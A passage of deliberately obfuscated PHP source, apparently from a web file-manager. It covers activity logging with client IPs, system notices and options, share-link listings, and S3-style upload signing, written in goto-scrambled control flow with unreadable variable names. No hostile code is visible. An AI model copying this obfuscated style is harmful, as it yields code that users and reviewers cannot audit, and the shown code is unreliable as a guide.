} $d˜ÖÌ÷ĞùÍ = USER_ID ? USER_ID : (isset($bµ¢­­òÑæ[$Bß×Áß‰Ÿ[1416]]) ? $bµ¢­­òÑæ[$Bß×Áß‰Ÿ[1416]] : 0); goto B¸¿•å»Ú; B¸¿•å»Ú: $AÑª”Œ¢Ê³ = get_client_ip(); if (!$bµ¢­­òÑæ || strlen(json_encode($bµ¢­­òÑæ)) >= 1024) { $bµ¢­­òÑæ = array($Bß×Áß‰Ÿ[2428] => $AÑª”Œ¢Ê³); } else { if (is_array($bµ¢­­òÑæ)) { $bµ¢­­òÑæ[$Bß×Áß‰Ÿ[2428]] = $AÑª”Œ¢Ê³; } else { $bµ¢­­òÑæ = array($Bß×Áß‰Ÿ[1034] => $bµ¢­­òÑæ, $Bß×Áß‰Ÿ[2428] => $AÑª”Œ¢Ê³); } } $bµ¢­­òÑæ = array($Bß×Áß‰Ÿ[1406] => Session::sign(), $Bß×Áß‰Ÿ[1407] => $d˜ÖÌ÷ĞùÍ, $Bß×Áß‰Ÿ[29] => $b»Ç÷›êñŒ, $Bß×Áß‰Ÿ[1409] => json_encode($bµ¢­­òÑæ)); goto fÕ°„Åœ©; fÕ°„Åœ©: parent::add($bµ¢­­òÑæ); goto c©¿”Æ¬; c©¿”Æ¬: } public function remove($e™£ôäÂä‡) { $this->where(array($_SERVER[Äº¡•ô™Ÿ][382] => $e™£ôäÂä‡))->delete(); } private function _makeOrder($CÈÁÏÎªÔ· = '') { goto AäÙ‰…–¦³; e¯ˆ‰ÒïãÕ: $b…ˆ¥ªÅ = Input::get($A¤”Ä¥ùóÄ[404], $A¤”Ä¥ùóÄ[7], $A¤”Ä¥ùóÄ[2217], array($A¤”Ä¥ùóÄ[2154], $A¤”Ä¥ùóÄ[400])); $b…ˆ¥ªÅ = $CÙ“¿œšÏ×[$b…ˆ¥ªÅ]; $CÈÁÏÎªÔ· = $CÈÁÏÎªÔ· . "{$B´Š¬¥}\x20{$b…ˆ¥ªÅ}"; goto a¾ï›ÉÔ…; a¾ï›ÉÔ…: return $this->order($CÈÁÏÎªÔ·); goto e›µª“Œí; AäÙ‰…–¦³: $A¤”Ä¥ùóÄ =& $_SERVER[Äº¡•ô™Ÿ]; $B´Š¬¥ = $A¤”Ä¥ùóÄ[184]; $CÙ“¿œšÏ× = array($A¤”Ä¥ùóÄ[398] => $A¤”Ä¥ùóÄ[399], $A¤”Ä¥ùóÄ[400] => $A¤”Ä¥ùóÄ[401]); goto e¯ˆ‰ÒïãÕ; e›µª“Œí: } public function get($Eô¦‰ç¤š = '') { goto e± ®ïà; bä‘ÇÙ§å´: if ($Eô¦‰ç¤š[$eÈÇ–—É›™[1416]]) { $ešÍ©ºŒ î[$eÈÇ–—É›™[1416]] = $Eô¦‰ç¤š[$eÈÇ–—É›™[1416]]; } if (isset($Eô¦‰ç¤š[$eÈÇ–—É›™[705]])) { $a˜»»±¬ = $Eô¦‰ç¤š[$eÈÇ–—É›™[705]]; $fĞã¥Ï¦Ã† = isset($Eô¦‰ç¤š[$eÈÇ–—É›™[706]]) ? $Eô¦‰ç¤š[$eÈÇ–—É›™[706]] : time(); $ešÍ©ºŒ î[$eÈÇ–—É›™[184]] = array($eÈÇ–—É›™[318], array($a˜»»±¬, $fĞã¥Ï¦Ã†)); } if ($Eô¦‰ç¤š[$eÈÇ–—É›™[29]]) { $aãâ“æÛ¬â = explode($eÈÇ–—É›™[47], $Eô¦‰ç¤š[$eÈÇ–—É›™[29]]); $A¶‹°î…Í = $this->typeFile(); $c×¤æ‹­Äô = array(); foreach ($aãâ“æÛ¬â as $BŠÛ÷šÓŒ) { $c×¤æ‹­Äô[] = $BŠÛ÷šÓŒ; if (isset($A¶‹°î…Í[$BŠÛ÷šÓŒ])) { $c×¤æ‹­Äô = array_merge($c×¤æ‹­Äô, $A¶‹°î…Í[$BŠÛ÷šÓŒ]); } } $c×¤æ‹­Äô = array_unique($c×¤æ‹­Äô); if ($c×¤æ‹­Äô) { $ešÍ©ºŒ î[$eÈÇ–—É›™[29]] = array($eÈÇ–—É›™[7], $c×¤æ‹­Äô); } } goto eÜ“‹…å«î; e± ®ïà: $eÈÇ–—É›™ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$Eô¦‰ç¤š) { show_json(array()); } $ešÍ©ºŒ î = array(); goto bä‘ÇÙ§å´; eÜ“‹…å«î: if (!empty($Eô¦‰ç¤š[$eÈÇ–—É›™[2428]])) { $ešÍ©ºŒ î[$eÈÇ–—É›™[401]] = array($eÈÇ–—É›™[754], "\x25{$Eô¦‰ç¤š[$eÈÇ–—É›™[2428]]}\45"); } $F„Œ—°ñ™ = $this->_makeOrder()->where($ešÍ©ºŒ î)->selectPage(); if (empty($F„Œ—°ñ™[$eÈÇ–—É›™[351]])) { show_json(array(), !0, $F„Œ—°ñ™[$eÈÇ–—É›™[348]]); } goto fÚß¨ÙùÅ; fÚß¨ÙùÅ: $F„Œ—°ñ™[$eÈÇ–—É›™[351]] = $this->logList($F„Œ—°ñ™[$eÈÇ–—É›™[351]]); return $F„Œ—°ñ™; goto dÂ Ú—«Ù; dÂ Ú—«Ù: } private function ipAddress(&$D×Ï¤ë–) { $CØ¿íâôó‡ =& $_SERVER[Äº¡•ô™Ÿ]; if (!empty($D×Ï¤ë–[$CØ¿íâôó‡[2428]])) { $d—óÚŠò¡– = IpLocation::get($D×Ï¤ë–[$CØ¿íâôó‡[2428]]); if ($d—óÚŠò¡– == $CØ¿íâôó‡[2429]) { $d—óÚŠò¡– = $CØ¿íâôó‡[2430]; } } else { $d—óÚŠò¡– = LNG($CØ¿íâôó‡[2431]); } $D×Ï¤ë–[$CØ¿íâôó‡[2432]] = $d—óÚŠò¡–; } private function descZipDownload($BšÆªÁ–õè, &$b¼ÈŒêÜ²) { $f³œøÕ =& $_SERVER[Äº¡•ô™Ÿ]; if (!isset($BšÆªÁ–õè[$f³œøÕ[2433]])) { return; } $BÑ­ââªÃ = json_decode($BšÆªÁ–õè[$f³œøÕ[2433]], !0); foreach ($BÑ­ââªÃ as $aøå°Ê†§) { if (!IO::init($aøå°Ê†§[$f³œøÕ[75]])) { continue; } if (!($FçËñ§ßÀ = IO::infoFull($aøå°Ê†§[$f³œøÕ[75]]))) { continue; } $BšÆªÁ–õè[$f³œøÕ[75]] = $aøå°Ê†§[$f³œøÕ[75]]; $b¼ÈŒêÜ²[] = $BšÆªÁ–õè[$f³œøÕ[2250]] = $FçËñ§ßÀ[$f³œøÕ[457]]; break; } return $BšÆªÁ–õè; } private function getSourceList(&$c­ÅŒö«…) { $B›åÓ¯»Ç =& $_SERVER[Äº¡•ô™Ÿ]; $f„¿ÊÁñÙç = array(); foreach ($c­ÅŒö«… as $cÕ—©æÖÜ« => $A½ÍĞ›õš) { goto Eë¹ƒè©Û; Eë¹ƒè©Û: $cÑºö÷Â = json_decode($A½ÍĞ›õš[$B›åÓ¯»Ç[401]], !0); if ($A½ÍĞ›õš[$B›åÓ¯»Ç[29]] == $B›åÓ¯»Ç[2051]) { $cÑºö÷Â = $this->descZipDownload($cÑºö÷Â, $f„¿ÊÁñÙç); $c­ÅŒö«…[$cÕ—©æÖÜ«][$B›åÓ¯»Ç[401]] = json_encode($cÑºö÷Â); continue; } if (strpos($A½ÍĞ›õš[$B›åÓ¯»Ç[29]], $B›åÓ¯»Ç[2251]) !== 0) { goto Eõœ„õÚôñ; F³¿ß—«ó: continue; goto b„”Š‹â¦“; A²Ü‰ÊÏ‘: $f„¿ÊÁñÙç[] = $cÑºö÷Â[$B›åÓ¯»Ç[366]] = $F…àœ¾Ø”î[$B›åÓ¯»Ç[366]]; $f„¿ÊÁñÙç[] = $cÑºö÷Â[$B›åÓ¯»Ç[2250]] = $F…àœ¾Ø”î[$B›åÓ¯»Ç[457]]; $c­ÅŒö«…[$cÕ—©æÖÜ«][$B›åÓ¯»Ç[401]] = json_encode($cÑºö÷Â); goto F³¿ß—«ó; Eõœ„õÚôñ: if (!isset($cÑºö÷Â[$B›åÓ¯»Ç[75]]) || strpos($A½ÍĞ›õš[$B›åÓ¯»Ç[29]], $B›åÓ¯»Ç[2434]) !== 0) { continue; } if (!IO::init($cÑºö÷Â[$B›åÓ¯»Ç[75]])) { continue; } if (!($F…àœ¾Ø”î = IO::infoFull($cÑºö÷Â[$B›åÓ¯»Ç[75]]))) { continue; } goto A²Ü‰ÊÏ‘; b„”Š‹â¦“: } goto dÓ”ãÚŞïø; Dí›“Ïğ°â: if ($cÑºö÷Â[$B›åÓ¯»Ç[29]] == $B›åÓ¯»Ç[2258]) { $f„¿ÊÁñÙç[] = $cÑºö÷Â[$B›åÓ¯»Ç[401]][$B›åÓ¯»Ç[366]]; } goto B¨Åë£ùÜ; dÓ”ãÚŞïø: $f„¿ÊÁñÙç[] = $cÑºö÷Â[$B›åÓ¯»Ç[366]]; $f„¿ÊÁñÙç[] = $cÑºö÷Â[$B›åÓ¯»Ç[2250]]; if ($cÑºö÷Â[$B›åÓ¯»Ç[29]] == $B›åÓ¯»Ç[488]) { $f„¿ÊÁñÙç[] = $cÑºö÷Â[$B›åÓ¯»Ç[401]][$B›åÓ¯»Ç[1006]]; $f„¿ÊÁñÙç[] = $cÑºö÷Â[$B›åÓ¯»Ç[401]][$B›åÓ¯»Ç[1007]]; } goto Dí›“Ïğ°â; B¨Åë£ùÜ: } if (!$f„¿ÊÁñÙç) { return array(); } return Model($B›åÓ¯»Ç[755])->sourceListInfo($f„¿ÊÁñÙç, !0); } private function logList($Fëâ´ø±”×) { goto c´«ÃÒ©‘ê; f²”¢ù¨İí: return $AÂŠ…Ìš—; goto BôÀø®Ö»¸; d ÌÓ°¶¦Ê: $Bå¬…¤¦ÙÑ = array(); foreach ($Fëâ´ø±”× as $E ÓÀƒ–çµ => $c–ë êª¨) { goto Fê«Ïæ¶; Fê«Ïæ¶: $b˜›šºãè¡ = $c–ë êª¨[$BÃ»“”Ú­¾[29]]; $b˜ò¼¨æò = isset($a«…ÀÉ¦…Ù[$c–ë êª¨[$BÃ»“”Ú­¾[1416]]]) ? $a«…ÀÉ¦…Ù[$c–ë êª¨[$BÃ»“”Ú­¾[1416]]] : !1; $DÚØ¥ ««ô = strpos($b˜›šºãè¡, $BÃ»“”Ú­¾[2435]) === 0 ? LNG($BÃ»“”Ú­¾[2436]) : LNG($BÃ»“”Ú­¾[2431]); goto eõ·æ“; Fñğ®™îÈÏ: $c–ë êª¨[$BÃ»“”Ú­¾[2216]] = $b˜ò¼¨æò; $f»Ú‚öš¿É = json_decode($c–ë êª¨[$BÃ»“”Ú­¾[401]], !0); $c–ë êª¨[$BÃ»“”Ú­¾[2428]] = isset($f»Ú‚öš¿É[$BÃ»“”Ú­¾[2428]]) ? $f»Ú‚öš¿É[$BÃ»“”Ú­¾[2428]] : $BÃ»“”Ú­¾[33]; goto C°„£Œ¾¦É; C°„£Œ¾¦É: $this->ipAddress($c–ë êª¨); if (strpos($b˜›šºãè¡, $BÃ»“”Ú­¾[2251]) === 0 || isset($f»Ú‚öš¿É[$BÃ»“”Ú­¾[2250]])) { goto féæ®ååĞ; B˜³³¡¢Š”: if ($f»Ú‚öš¿É[$BÃ»“”Ú­¾[2263]] && $f»Ú‚öš¿É[$BÃ»“”Ú­¾[2263]][$BÃ»“”Ú­¾[368]] == $BÃ»“”Ú­¾[1080]) { $Bå¬…¤¦ÙÑ[] = $c–ë êª¨[$BÃ»“”Ú­¾[364]]; unset($Fëâ´ø±”×[$E ÓÀƒ–çµ]); continue; } goto BÒê¶¡ÉÈ•; b‰Òİ¥êç¨: if ($f»Ú‚öš¿É[$BÃ»“”Ú­¾[29]] == $BÃ»“”Ú­¾[2258]) { $f»Ú‚öš¿É[$BÃ»“”Ú­¾[401]][$BÃ»“”Ú­¾[366]] = $Bƒ«µ™­Ë[$f»Ú‚öš¿É[$BÃ»“”Ú­¾[401]][$BÃ»“”Ú­¾[366]]]; } if ($f»Ú‚öš¿É[$BÃ»“”Ú­¾[29]] == $BÃ»“”Ú­¾[2046]) { $f»Ú‚öš¿É[$BÃ»“”Ú­¾[2263]] = $f»Ú‚öš¿É[$BÃ»“”Ú­¾[388]]; $f»Ú‚öš¿É[$BÃ»“”Ú­¾[2250]] = $f»Ú‚öš¿É[$BÃ»“”Ú­¾[2263]][$BÃ»“”Ú­¾[366]]; $f»Ú‚öš¿É[$BÃ»“”Ú­¾[388]] = !1; $f»Ú‚öš¿É[$BÃ»“”Ú­¾[366]] = $BÃ»“”Ú­¾[33]; } if ($f»Ú‚öš¿É[$BÃ»“”Ú­¾[388]] && $f»Ú‚öš¿É[$BÃ»“”Ú­¾[388]][$BÃ»“”Ú­¾[368]] == $BÃ»“”Ú­¾[1080]) { $Bå¬…¤¦ÙÑ[] = $c–ë êª¨[$BÃ»“”Ú­¾[364]]; unset($Fëâ´ø±”×[$E ÓÀƒ–çµ]); continue; } goto B˜³³¡¢Š”; féæ®ååĞ: $f»Ú‚öš¿É[$BÃ»“”Ú­¾[388]] = $Bƒ«µ™­Ë[$f»Ú‚öš¿É[$BÃ»“”Ú­¾[366]]]; $f»Ú‚öš¿É[$BÃ»“”Ú­¾[2263]] = $Bƒ«µ™­Ë[$f»Ú‚öš¿É[$BÃ»“”Ú­¾[2250]]]; if ($f»Ú‚öš¿É[$BÃ»“”Ú­¾[29]] == $BÃ»“”Ú­¾[488]) { $f»Ú‚öš¿É[$BÃ»“”Ú­¾[401]][$BÃ»“”Ú­¾[1006]] = $Bƒ«µ™­Ë[$f»Ú‚öš¿É[$BÃ»“”Ú­¾[401]][$BÃ»“”Ú­¾[1006]]]; $f»Ú‚öš¿É[$BÃ»“”Ú­¾[401]][$BÃ»“”Ú­¾[1007]] = $Bƒ«µ™­Ë[$f»Ú‚öš¿É[$BÃ»“”Ú­¾[401]][$BÃ»“”Ú­¾[1007]]]; } goto b‰Òİ¥êç¨; BÒê¶¡ÉÈ•: } $c–ë êª¨[$BÃ»“”Ú­¾[401]] = $f»Ú‚öš¿É; goto añ‹áİµó¥; eõ·æ“: $c–ë êª¨[$BÃ»“”Ú­¾[28]] = isset($b˜ò¼¨æò[$BÃ»“”Ú­¾[28]]) ? $b˜ò¼¨æò[$BÃ»“”Ú­¾[28]] : LNG($BÃ»“”Ú­¾[2431]); $c–ë êª¨[$BÃ»“”Ú­¾[2299]] = isset($b˜ò¼¨æò[$BÃ»“”Ú­¾[2299]]) ? $b˜ò¼¨æò[$BÃ»“”Ú­¾[2299]] : $BÃ»“”Ú­¾[33]; $c–ë êª¨[$BÃ»“”Ú­¾[1321]] = isset($FĞª‚öØÊ”[$b˜›šºãè¡]) ? $FĞª‚öØÊ”[$b˜›šºãè¡] : $DÚØ¥ ««ô; goto Fñğ®™îÈÏ; añ‹áİµó¥: unset($c–ë êª¨[$BÃ»“”Ú­¾[2437]]); $AÂŠ…Ìš—[] = $c–ë êª¨; goto bÄ¬œåŠÂŒ; bÄ¬œåŠÂŒ: } $this->clearSystemPathLog($Bå¬…¤¦ÙÑ); goto f²”¢ù¨İí; c´«ÃÒ©‘ê: $BÃ»“”Ú­¾ =& $_SERVER[Äº¡•ô™Ÿ]; $AÃ×‰»¹ÛÃ = array_to_keyvalue($Fëâ´ø±”×, $BÃ»“”Ú­¾[33], $BÃ»“”Ú­¾[1416]); $a«…ÀÉ¦…Ù = Model($BÃ»“”Ú­¾[473])->userListInfo(array_unique($AÃ×‰»¹ÛÃ)); goto FÂĞàÆ’àí; FÂĞàÆ’àí: $Bƒ«µ™­Ë = $this->getSourceList($Fëâ´ø±”×); $FĞª‚öØÊ” = $this->typeAll(); $AÂŠ…Ìš— = array(); goto d ÌÓ°¶¦Ê; BôÀø®Ö»¸: } private function clearSystemPathLog($eÒ¥äÚ¼) { $BŒğ·­²öë =& $_SERVER[Äº¡•ô™Ÿ]; if (count($eÒ¥äÚ¼) == 0) { return; } $D±À³²§… = array($BŒğ·­²öë[364] => array($BŒğ·­²öë[7], array_unique($eÒ¥äÚ¼))); $this->where($D±À³²§…)->delete(); } public function deviceList($bÀ‰‹î¿¬©, $dÉæ–šåª¼ = 0) { $a·¢´æ± á =& $_SERVER[Äº¡•ô™Ÿ]; $b•—Â¹¿¥× = array($a·¢´æ± á[1416] => $bÀ‰‹î¿¬©, $a·¢´æ± á[184] => array($a·¢´æ± á[930], $dÉæ–šåª¼), $a·¢´æ± á[29] => $a·¢´æ± á[2019]); $FÑïğŞ¬á = array(); $A¸Âİ¢Êö› = $this->field($a·¢´æ± á[2438])->where($b•—Â¹¿¥×)->order($a·¢´æ± á[2261])->limit(50)->select(); foreach ($A¸Âİ¢Êö› as $fíÌ¦å§À => $eâÚ¯Ğºè) { goto c›‰·ÏÁ±Ğ; b¥œõ–­ƒ: unset($C¼¦§Â„íÎ[$a·¢´æ± á[2428]]); $bˆ¶ôéè = $this->deviceType($C¼¦§Â„íÎ[$a·¢´æ± á[2252]]); if (isset($FÑïğŞ¬á[$bˆ¶ôéè])) { continue; } goto cë¼…ª³¹; c›‰·ÏÁ±Ğ: if ($fíÌ¦å§À > 0 && abs($eâÚ¯Ğºè[$a·¢´æ± á[184]] - $A¸Âİ¢Êö›[$fíÌ¦å§À - 1][$a·¢´æ± á[184]]) < 5) { continue; } $C¼¦§Â„íÎ = json_decode($eâÚ¯Ğºè[$a·¢´æ± á[401]], !0); $eâÚ¯Ğºè[$a·¢´æ± á[2428]] = isset($C¼¦§Â„íÎ[$a·¢´æ± á[2428]]) ? $C¼¦§Â„íÎ[$a·¢´æ± á[2428]] : $a·¢´æ± á[33]; goto b¥œõ–­ƒ; cë¼…ª³¹: $this->ipAddress($eâÚ¯Ğºè); $eâÚ¯Ğºè[$a·¢´æ± á[401]] = $C¼¦§Â„íÎ; $FÑïğŞ¬á[$bˆ¶ôéè] = $eâÚ¯Ğºè; goto BÆá³Ã–¾³; BÆá³Ã–¾³: } return array_values($FÑïğŞ¬á); } public function deviceType($e×©ö«¡ ­) { return $e×©ö«¡ ­; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\x6e\x6f\x74\x69\143\x65\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\x65", "\x63\x6f\156\x74\x65\x6e\x74", "\x61\x75\x74\x68", "\x6d\157\144\145", "\164\151\x6d\x65", "\x74\171\x70\145", "\154\145\166\x65\154", "\x65\x6e\141\x62\x6c\145", "\x73\x6f\162\x74"); public function listData($D…î°äøå’ = false, $fÇÈ¸âİ = "\163\x6f\162\x74", $d’»†ëìôã = false) { return parent::listData($D…î°äøå’, $fÇÈ¸âİ, $d’»†ëìôã); } public function add($dã‡£ÀèÂ) { goto aßß¼¥¦¶; aßß¼¥¦¶: $e¯Á½’ãœó =& $_SERVER[Äº¡•ô™Ÿ]; $AÛÄÕ·¢Ñä = $this->findByName($dã‡£ÀèÂ[$e¯Á½’ãœó[28]]); if ($AÛÄÕ·¢Ñä) { return !1; } goto DšÇ®ãÍì»; DšÇ®ãÍì»: $C›Ö‚ÅÃâß = time(); if ($dã‡£ÀèÂ[$e¯Á½’ãœó[12]] == $e¯Á½’ãœó[2439]) { $C›Ö‚ÅÃâß = strtotime($dã‡£ÀèÂ[$e¯Á½’ãœó[187]]); } $dã‡£ÀèÂ[$e¯Á½’ãœó[187]] = $C›Ö‚ÅÃâß; goto aÍÇÜ×’ƒ; aÍÇÜ×’ƒ: return parent::insert($dã‡£ÀèÂ); goto d·Ÿ³ïµÓ; d·Ÿ³ïµÓ: } public function update($Eäæ—–Øò°, $E…Ù„ØõÓ) { goto EêõÀ“Œ£È; E×Ñ®©Œ©÷: $E…Ù„ØõÓ[$FºƒæÇë[187]] = $d¾»ï‚¡Ã—; return parent::update($Eäæ—–Øò°, $E…Ù„ØõÓ); goto Fó„Š¶öå; C¹ ¨à¯‚É: if (!$B×òÃĞŸè• || $C®ØãÚÊ÷Í && $C®ØãÚÊ÷Í[$FºƒæÇë[364]] != $B×òÃĞŸè•[$FºƒæÇë[364]]) { return !1; } $d¾»ï‚¡Ã— = time(); if ($E…Ù„ØõÓ[$FºƒæÇë[12]] == $FºƒæÇë[2439]) { $d¾»ï‚¡Ã— = strtotime($E…Ù„ØõÓ[$FºƒæÇë[187]]); } goto E×Ñ®©Œ©÷; EêõÀ“Œ£È: $FºƒæÇë =& $_SERVER[Äº¡•ô™Ÿ]; $B×òÃĞŸè• = $this->listData($Eäæ—–Øò°); $C®ØãÚÊ÷Í = $this->findByName($E…Ù„ØõÓ[$FºƒæÇë[28]]); goto C¹ ¨à¯‚É; Fó„Š¶öå: } public function remove($b »ö÷—½) { $B‘Ö´Ç¼Û = $this->listData($b »ö÷—½); if (!$B‘Ö´Ç¼Û || $B‘Ö´Ç¼Û[$_SERVER[Äº¡•ô™Ÿ][1080]]) { return !1; } return parent::remove($b »ö÷—½); } public function sort($d¾‹æÁó, $FÕ×Ú©˜‡Ğ) { return parent::update($d¾‹æÁó, $FÕ×Ú©˜‡Ğ); } public function enable($cµ‘²ŞÓ„”, $CƒØ¤®µÑ) { return parent::update($cµ‘²ŞÓ„”, array($_SERVER[Äº¡•ô™Ÿ][2440] => $CƒØ¤®µÑ)); } private function initUserOption() { $A“êŠÏøÜ‡ =& $_SERVER[Äº¡•ô™Ÿ]; $this->optionType = $A“êŠÏøÜ‡[2441]; $this->modelType = $A“êŠÏøÜ‡[2442]; $this->field = array($A“êŠÏøÜ‡[2443], $A“êŠÏøÜ‡[28], $A“êŠÏøÜ‡[187], $A“êŠÏøÜ‡[29], $A“êŠÏøÜ‡[2444], $A“êŠÏøÜ‡[692], $A“êŠÏøÜ‡[180]); } public function userNoticeGet($e±îÍİøê© = false) { $this->initUserOption(); return parent::listData($e±îÍİøê©, $_SERVER[Äº¡•ô™Ÿ][364], !0); } public function userNoticeAdd($eÕ’Ş™•«) { $fŠÅ§Ë‰« =& $_SERVER[Äº¡•ô™Ÿ]; $this->initUserOption(); $eƒ‰’¨ÏÜÍ = $this->findByKey($fŠÅ§Ë‰«[2443], $eÕ’Ş™•«[$fŠÅ§Ë‰«[364]]); if ($eƒ‰’¨ÏÜÍ) { return !0; } $C»½·ëô·˜ = array($fŠÅ§Ë‰«[2443] => $eÕ’Ş™•«[$fŠÅ§Ë‰«[364]], $fŠÅ§Ë‰«[28] => $eÕ’Ş™•«[$fŠÅ§Ë‰«[28]], $fŠÅ§Ë‰«[187] => $eÕ’Ş™•«[$fŠÅ§Ë‰«[187]], $fŠÅ§Ë‰«[29] => isset($eÕ’Ş™•«[$fŠÅ§Ë‰«[29]]) ? $eÕ’Ş™•«[$fŠÅ§Ë‰«[29]] : 1, $fŠÅ§Ë‰«[2444] => isset($eÕ’Ş™•«[$fŠÅ§Ë‰«[2444]]) ? $eÕ’Ş™•«[$fŠÅ§Ë‰«[2444]] : 0, $fŠÅ§Ë‰«[692] => 0, $fŠÅ§Ë‰«[180] => 0); return parent::insert($C»½·ëô·˜); } public function userNoticeEdit($DÊˆØÊÏ‹¥, $cê×ëæ‰“) { $this->initUserOption(); return parent::update($DÊˆØÊÏ‹¥, $cê×ëæ‰“); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\x65\x6d\x5f\x6f\x70\x74\151\x6f\156"; protected $jsonField = array("\155\145\x6e\165", "\162\157\x6c\145", "\162\x6f\154\x65\107\x72\x6f\x75\160", "\x72\x65\147\151\163\164", "\x65\x6d\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($có¢•ìµ) { return "\x53\171\x73\164\145\x6d\x4f\x70\164\x69\157\x6e\137{$có¢•ìµ}"; } protected function optionDefault($FÖÈÍÊ½† = '') { $EŒˆ«ÕÔ—¬ =& $_SERVER[Äº¡•ô™Ÿ]; if ($FÖÈÍÊ½† == $EŒˆ«ÕÔ—¬[33]) { return $GLOBALS[$EŒˆ«ÕÔ—¬[6]][$EŒˆ«ÕÔ—¬[2445]]; } } } goto CÄ†¬©éÃ; f±³²È‰ƒ×: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($c˜¨‚¿‡÷) { $this->pathParse = $c˜¨‚¿‡÷; } protected function infoParse($D¯øÒ¤Õ‘ˆ) { $B¡Šùš®Õ =& $_SERVER[Äº¡•ô™Ÿ]; return Action($B¡Šùš®Õ[1017])->sharePathInfo($this->pathParse[$B¡Šùš®Õ[75]], !0); } public function listPath($dÚ……ñù¹Û, $B‚Ï£æºˆ± = false) { $d´·¶„×ë =& $_SERVER[Äº¡•ô™Ÿ]; $däÀİ¥½ö¿ = IO::listPath($dÚ……ñù¹Û, $B‚Ï£æºˆ±); foreach ($däÀİ¥½ö¿ as $bÀÖÏÉ’ØÀ => $e¥ ·©¹¶) { if (!in_array($bÀÖÏÉ’ØÀ, array($d´·¶„×ë[73], $d´·¶„×ë[74]))) { continue; } foreach ($e¥ ·©¹¶ as $Eğ†…´·÷Ó => $c”¼ƒŠœÎ) { $c”¼ƒŠœÎ = Action($d´·¶„×ë[1125])->parsePathChildren($c”¼ƒŠœÎ, array($d´·¶„×ë[384] => $dÚ……ñù¹Û)); $däÀİ¥½ö¿[$bÀÖÏÉ’ØÀ][$Eğ†…´·÷Ó] = Action($d´·¶„×ë[1017])->shareItemInfo($c”¼ƒŠœÎ); } } return $däÀİ¥½ö¿; } public function listAll($EÌ•İ‰Ó¬) { $c“òìŸ¹Œß =& $_SERVER[Äº¡•ô™Ÿ]; $CßçÅŸÍÙ¸ = IO::listAll($EÌ•İ‰Ó¬); foreach ($CßçÅŸÍÙ¸ as &$DèÀ¾ğÚåæ) { $DèÀ¾ğÚåæ = array_merge(IO::info($DèÀ¾ğÚåæ[$c“òìŸ¹Œß[75]]), $DèÀ¾ğÚåæ); $DèÀ¾ğÚåæ[$c“òìŸ¹Œß[388]] = Action($c“òìŸ¹Œß[1017])->shareItemInfo($DèÀ¾ğÚåæ); } return $CßçÅŸÍÙ¸; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Bœá…Ôå’ù) { parent::__construct($Bœá…Ôå’ù); $this->signatureVersion($_SERVER[Äº¡•ô™Ÿ][197]); } public function uploadFormData($A†ˆß¬£„É, $cÈšÚ‹®Ÿ  = 3600) { goto d”ì¥ŠÏ•–; FÆå‹ˆ¡‚: $a•ğŒÒÉ‹ = $eŠÛ±‚Ğó[59]; $a‚¹‚»ËÒ = gmdate($eŠÛ±‚Ğó[1127]); $cÍ’îù¤„ = gmdate($eŠÛ±‚Ğó[693]); goto C¢Ş¤á¦à‹; FíÃœ˜ºİ·: $bÒœòŠ“ï = array($this->accessKey, $cÍ’îù¤„, $this->region, $a•ğŒÒÉ‹, $C”á˜‰®‘ì); $c‡Ê§ÛËöï = implode($eŠÛ±‚Ğó[8], $bÒœòŠ“ï); $bàèªßÏä´ = array($eŠÛ±‚Ğó[1095] => gmdate($eŠÛ±‚Ğó[1094], strtotime($eŠÛ±‚Ğó[1129])), $eŠÛ±‚Ğó[1096] => array(array($eŠÛ±‚Ğó[1098] => $this->bucket), array($eŠÛ±‚Ğó[1097] => $D“Ü²ÅÄÚ–), array($eŠÛ±‚Ğó[1099], $eŠÛ±‚Ğó[1100], $eŠÛ±‚Ğó[33]), array($eŠÛ±‚Ğó[1099], $eŠÛ±‚Ğó[1130], $eŠÛ±‚Ğó[33]), array($eŠÛ±‚Ğó[1099], $eŠÛ±‚Ğó[1131], $eŠÛ±‚Ğó[33]), array($eŠÛ±‚Ğó[1101] => $cÅ‚¾®÷ä‘), array($eŠÛ±‚Ğó[1132] => $c‡Ê§ÛËöï), array($eŠÛ±‚Ğó[1133] => $e»áìÃÜå), array($eŠÛ±‚Ğó[1134] => $a‚¹‚»ËÒ), array($eŠÛ±‚Ğó[1135] => $Dñí£ˆ§š®))); goto CŸë‘ˆÂ; C¢Ş¤á¦à‹: $C”á˜‰®‘ì = $eŠÛ±‚Ğó[1128]; $Dñí£ˆ§š® = $cÈšÚ‹®Ÿ  . $eŠÛ±‚Ğó[33]; $cÅ‚¾®÷ä‘ = $eŠÛ±‚Ğó[1093]; goto FíÃœ˜ºİ·; D Òİ±ƒó: $F¬ù²‡Ç¶à = array($eŠÛ±‚Ğó[196] => $eŠÛ±‚Ğó[33], $eŠÛ±‚Ğó[1138] => $eŠÛ±‚Ğó[33], $eŠÛ±‚Ğó[1097] => $D“Ü²ÅÄÚ–, $eŠÛ±‚Ğó[1101] => $cÅ‚¾®÷ä‘, $eŠÛ±‚Ğó[1105] => $EÉÕÓ¢Ù£Í, $eŠÛ±‚Ğó[1139] => $c‡Ê§ÛËöï, $eŠÛ±‚Ğó[1140] => $e»áìÃÜå, $eŠÛ±‚Ğó[1141] => $a‚¹‚»ËÒ, $eŠÛ±‚Ğó[1142] => $Dñí£ˆ§š®, $eŠÛ±‚Ğó[1143] => $b…³ùÊÆï‘, $eŠÛ±‚Ğó[166] => $this->getHost()); return $F¬ù²‡Ç¶à; goto Bºà†ã¬¼¹; D¦ÉŒĞç„·: $b±ã·´¶¾¶ = hash_hmac($eŠÛ±‚Ğó[1136], $a•ğŒÒÉ‹, $d°‰ˆ¢Î™, !0); $DÓ¦“±…ä« = hash_hmac($eŠÛ±‚Ğó[1136], $C”á˜‰®‘ì, $b±ã·´¶¾¶, !0); $b…³ùÊÆï‘ = hash_hmac($eŠÛ±‚Ğó[1136], $EÉÕÓ¢Ù£Í, $DÓ¦“±…ä«); goto D Òİ±ƒó; CŸë‘ˆÂ: $EÉÕÓ¢Ù£Í = base64_encode(json_encode($bàèªßÏä´)); $cÈ˜ŒÍÈä = hash_hmac($eŠÛ±‚Ğó[1136], $cÍ’îù¤„, $eŠÛ±‚Ğó[1137] . $this->secret, !0); $d°‰ˆ¢Î™ = hash_hmac($eŠÛ±‚Ğó[1136], 